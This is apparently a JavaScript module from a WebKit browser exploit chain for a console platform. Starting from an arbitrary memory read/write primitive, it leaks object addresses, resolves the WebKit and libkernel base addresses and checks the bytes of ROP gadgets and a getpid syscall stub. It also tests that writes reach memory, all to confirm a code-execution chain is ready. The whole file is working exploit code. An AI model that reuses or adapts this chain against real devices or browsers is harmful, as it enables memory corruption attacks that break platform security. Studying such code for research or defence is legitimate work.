/**
 * OOM-safe exploit proof — read-only chain verify + one 8-byte write test.
 * Proves: arb R/W, correct webkit/libkernel bases, syscall stub reachable.
 * Does NOT call getpid (no Math.expm1 pivot / no pivot buffers).
 */
import { int64 } from "./int64.js";

const ELF_MAGIC = 0x464c457f;
const SYS_GETPID = 20;

const POP_CHECKS = [
    ["POP_RDI", "wk_POP_RDI_RET", [0x5f, 0xc3]],
    ["POP_RSI", "wk_POP_RSI_RET", [0x5e, 0xc3]],
    ["POP_RDX", "wk_POP_RDX_RET", [0x5a, 0xc3]],
    ["POP_RCX", "wk_POP_RCX_RET", [0x59, 0xc3]],
    ["POP_RAX", "wk_POP_RAX_RET", [0x58, 0xc3]],
    ["POP_R8", "wk_POP_R8_RET", [null, 0x58, 0xc3]],
    ["POP_R9", "wk_POP_R9_RET", [null, 0x59, 0xc3]],
    ["LEAVE", "wk_LEAVE_RET", [0xc9, 0xc3]],
];

const PIVOT_CHECKS = [
    ["G0", "wk_MOV_RDI_RSI_30_CALL", [0x48, 0x8b, 0x7e, 0x30]],
    ["G1", "wk_POP_RAX_MOV_RAX_JMP_18", [0x58, 0x48, 0x8b, 0x07]],
    ["G2", "wk_PUSH_RBP_MOV_RBP_RSP_10", [0x55, 0x48, 0x89, 0xe5]],
    ["G3", "wk_MOV_RDI_RAX_8_CALL_20", [0x48, 0x8b, 0x78, 0x08]],
    ["G4", "wk_MOV_RDX_RAX_18_CALL_10", [0x48, 0x8b, 0x50, 0x38]],
    ["G5", "wk_PUSH_RDX_POP_RSP_RET", [0x52, 0x5c, 0xc3]],
];

function read1p(p, addr) {
    try { return p.read1(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    try { return p.read4(addr); } catch (_) { return null; }
}

function read8p(p, addr) {
    try { return p.read8(addr); } catch (_) { return null; }
}

function fmtMagic(v) {
    if (v == null) return "null";
    return "0x" + (v >>> 0).toString(16);
}

function parseAddr(str) {
    if (!str) return null;
    const s = String(str).trim().toLowerCase().replace(/^0x/, "");
    if (!/^[0-9a-f]+$/.test(s)) return null;
    if (s.length <= 8) return new int64(parseInt(s, 16), 0);
    return new int64(parseInt(s.slice(-8), 16), parseInt(s.slice(0, -8), 16));
}

function checkGadgetBytes(p, base, rva, pat) {
    if (rva == null) return false;
    const a = base.add32(rva);
    for (let i = 0; i < pat.length; i++) {
        if (pat[i] === null) continue;
        if (read1p(p, a.add32(i)) !== pat[i]) return false;
    }
    return true;
}

function stubSysnum(v) {
    if (!v) return -1;
    return ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
}

function isSyscallStub(v, num) {
    if (!v) return false;
    if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) return false;
    return stubSysnum(v) === num;
}

function resolveWebkitBase(off, nativeFn) {
    try {
        const raw = sessionStorage.getItem("wk-webkitBase");
        if (raw) {
            const b = parseAddr(String(raw).replace(/^0x/i, ""));
            if (b) return b;
        }
    } catch (_) { }
    if (nativeFn && off.wk_expm1_builtin)
        return nativeFn.sub32(off.wk_expm1_builtin);
    return null;
}

function captureNativeFn(p, off) {
    try {
        const raw = sessionStorage.getItem("wk-nativeFn");
        if (raw) {
            const fn = parseAddr(String(raw).replace(/^0x/i, ""));
            if (fn) return fn;
        }
    } catch (_) { }
    const cell = p.leakval(Math.expm1);
    return read8p(p, read8p(p, cell.add32(0x18))
        .add32(off.wk_JSFunction_m_function || 0x28));
}

function verifyWebkitBase(p, off, base) {
    const magic = read4p(p, base);
    if (magic === ELF_MAGIC)
        return { ok: true, line: "WEBKIT-ELF  magic=0x7f454c46 @ " + base };
    if (off.wk_POP_RDI_RET != null
        && checkGadgetBytes(p, base, off.wk_POP_RDI_RET, [0x5f, 0xc3])) {
        return {
            ok: true,
            line: "WEBKIT-TEXT POP_RDI @+" + off.wk_POP_RDI_RET.toString(16) + " base=" + base,
        };
    }
    return { ok: false, line: "WEBKIT-BAD  peek=" + fmtMagic(magic) + " @ " + base };
}

function verifyLibkernel(p, off, webkitBase) {
    if (!off.wk___imp___error || !off.k__error)
        return { ok: null, lkBase: null, line: "LIBKERNEL-SKIP  no IAT offsets" };
    const errorFn = read8p(p, webkitBase.add32(off.wk___imp___error));
    if (!errorFn)
        return { ok: false, lkBase: null, line: "LIBKERNEL-IAT-FAIL  __imp___error null" };
    const lk = errorFn.sub32(off.k__error);
    const w0 = read4p(p, lk);
    const w1 = read4p(p, lk.add32(4));
    if (w1 != null && (w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f)
        return { ok: true, lkBase: lk, line: "LIBKERNEL-OK  base=" + lk + " (_error prologue)" };
    return {
        ok: false, lkBase: null,
        line: "LIBKERNEL-BAD  " + lk + " w0=" + fmtMagic(w0) + " w1=" + fmtMagic(w1),
    };
}

function verifyGetpidStub(p, off, lkBase) {
    const o = off.k_stubs && off.k_stubs[SYS_GETPID];
    if (o == null)
        return { ok: null, stub: null, line: "GETPID-STUB-SKIP  no k_stubs[20]" };
    const stub = lkBase.add32(o);
    const v = read8p(p, stub);
    if (isSyscallStub(v, SYS_GETPID))
        return {
            ok: true, stub,
            line: "GETPID-STUB-OK  @+" + o.toString(16) + " mov rax,20;syscall pattern",
        };
    return {
        ok: false, stub: null,
        line: "GETPID-STUB-BAD  @+" + o.toString(16) + " read8=" + (v ? String(v) : "null"),
    };
}

function verifyNativeCode(p, nativeFn) {
    const q0 = read4p(p, nativeFn);
    if (q0 == null || q0 === 0 || q0 === 0xffffffff || q0 === 0xcccccccc)
        return { ok: false, line: "NATIVEFN-BAD  code0=" + fmtMagic(q0) };
    return { ok: true, line: "NATIVEFN-OK  expm1 code @ " + nativeFn + " first4=" + fmtMagic(q0) };
}

/** One 8-byte buffer — proves write4 reaches backing store (not just read8). */
function verifyWriteBack(p, off) {
    const ab = new ArrayBuffer(8);
    const view = new Uint32Array(ab);
    view[0] = 0xaabbccdd;
    const cell = p.leakval(ab);
    const impl = read8p(p, cell.add32(off.wk_ArrayBuffer_m_impl));
    if (!impl) return { ok: false, line: "WRITE-PROOF-FAIL  no ArrayBuffer impl" };
    const data = read8p(p, impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
    if (!data) return { ok: false, line: "WRITE-PROOF-FAIL  no backing ptr" };
    const got = read4p(p, data);
    if (got !== 0xaabbccdd)
        return { ok: false, line: "WRITE-PROOF-FAIL  read4=" + fmtMagic(got) };
    p.write4(data, new int64(0x600dbeef, 0));
    if (view[0] !== 0x600dbeef)
        return { ok: false, line: "WRITE-PROOF-FAIL  js view still " + fmtMagic(view[0]) };
    p.write4(data, new int64(0xaabbccdd, 0));
    return { ok: true, line: "WRITE-PROOF-OK  backing 0xaabbccdd→0x600dbeef→restore" };
}

function verifyDistinctLeak(p) {
    const a = { tag: "pfA" };
    const b = { tag: "pfB" };
    const ca = p.leakval(a);
    const cb = p.leakval(b);
    if (!ca || !cb || (ca.low === cb.low && ca.hi === cb.hi))
        return { ok: false, line: "LEAK-PROOF-FAIL  same cell" };
    const ha = read8p(p, ca);
    if (!ha) return { ok: false, line: "LEAK-PROOF-FAIL  read8 header" };
    p.write8(ca, ha);
    if (String(p.read8(ca)) !== String(ha))
        return { ok: false, line: "LEAK-PROOF-FAIL  header roundtrip" };
    return { ok: true, line: "LEAK-PROOF-OK  distinct cells + header rw @ " + ca + " / " + cb };
}

/**
 * @param {object} p window.p
 * @param {object} off offset table
 * @param {{ log?: function }} opts
 */
export function runChainProof(p, off, opts) {
    opts = opts || {};
    const log = opts.log || (() => {});
    const lines = [];
    let ok = true;
    let hardFail = false;

    function step(tag, detail, pass) {
        const line = tag + (detail ? "  " + detail : "");
        lines.push(line);
        log(tag, detail || "");
        if (pass === false) {
            ok = false;
            hardFail = true;
        } else if (pass === null) {
            /* skip — not counted */
        } else if (pass !== true) {
            ok = false;
        }
    }

    const nativeFn = captureNativeFn(p, off);
    if (!nativeFn) {
        step("PROOF-FAIL", "nativeFn missing — cal Accept first", false);
        return { ok: false, lines, webkitBase: null, libkernelBase: null };
    }

    const nf = verifyNativeCode(p, nativeFn);
    step(nf.ok ? "PASS" : "FAIL", nf.line, nf.ok);

    const webkitBase = resolveWebkitBase(off, nativeFn);
    if (!webkitBase) {
        step("PROOF-FAIL", "webkitBase missing", false);
        return { ok: false, lines, webkitBase: null, libkernelBase: null };
    }

    const wb = verifyWebkitBase(p, off, webkitBase);
    step(wb.ok ? "PASS" : "FAIL", wb.line, wb.ok);
    if (!wb.ok) hardFail = true;

    let popOk = 0;
    for (let i = 0; i < POP_CHECKS.length; i++) {
        const [name, key, pat] = POP_CHECKS[i];
        const rva = off[key];
        const good = checkGadgetBytes(p, webkitBase, rva, pat);
        if (good) popOk++;
        step(good ? "PASS" : "FAIL", name + " @+" + (rva != null ? rva.toString(16) : "?")
            + (good ? " bytes OK" : " BAD"), good);
    }
    step(popOk === POP_CHECKS.length ? "PASS" : "FAIL",
        "pop gadgets " + popOk + "/" + POP_CHECKS.length, popOk === POP_CHECKS.length);

    let pivotOk = 0;
    for (let i = 0; i < PIVOT_CHECKS.length; i++) {
        const [name, key, pat] = PIVOT_CHECKS[i];
        let usePat = pat;
        if (name === "G4" && off.pivot_view_sp != null)
            usePat = [0x48, 0x8b, 0x50, off.pivot_view_sp & 0xff];
        const rva = off[key];
        const good = rva != null && checkGadgetBytes(p, webkitBase, rva, usePat);
        if (good) pivotOk++;
        step(good ? "PASS" : "WARN", "pivot " + name + " @+" + (rva != null ? rva.toString(16) : "?")
            + (good ? " OK" : " bad (13.00 RVA — native may fail)"), good ? true : null);
    }

    const lk = verifyLibkernel(p, off, webkitBase);
    step(lk.ok ? "PASS" : (lk.ok === null ? "SKIP" : "FAIL"), lk.line, lk.ok);
    if (lk.ok === false) hardFail = true;

    let stubOk = null;
    if (lk.ok && lk.lkBase) {
        const st = verifyGetpidStub(p, off, lk.lkBase);
        stubOk = st.ok;
        step(st.ok ? "PASS" : (st.ok === null ? "SKIP" : "FAIL"), st.line, st.ok);
        if (st.ok === false) hardFail = true;
    }

    const leak = verifyDistinctLeak(p);
    step(leak.ok ? "PASS" : "FAIL", leak.line, leak.ok);

    const wr = verifyWriteBack(p, off);
    step(wr.ok ? "PASS" : "FAIL", wr.line, wr.ok);

    const chainReady = wb.ok && popOk === POP_CHECKS.length && lk.ok && stubOk !== false;
    const proofOk = ok && !hardFail && leak.ok && wr.ok && wb.ok && popOk === POP_CHECKS.length;

    if (proofOk && chainReady) {
        step("PROOF-OK", "chain verified — arb rw + webkit + libkernel + getpid stub"
            + " (syscall not invoked; pivot " + pivotOk + "/6)", true);
        try {
            sessionStorage.setItem("wk-chain-proof", JSON.stringify({
                t: Date.now(),
                webkitBase: String(webkitBase),
                libkernelBase: lk.lkBase ? String(lk.lkBase) : "",
                popOk,
                pivotOk,
            }));
        } catch (_) { }
    } else {
        step("PROOF-FAIL", "see FAIL lines above", false);
    }

    return {
        ok: proofOk && chainReady,
        lines,
        webkitBase,
        libkernelBase: lk.lkBase || null,
        nativeFn,
        popOk,
        pivotOk,
    };
}
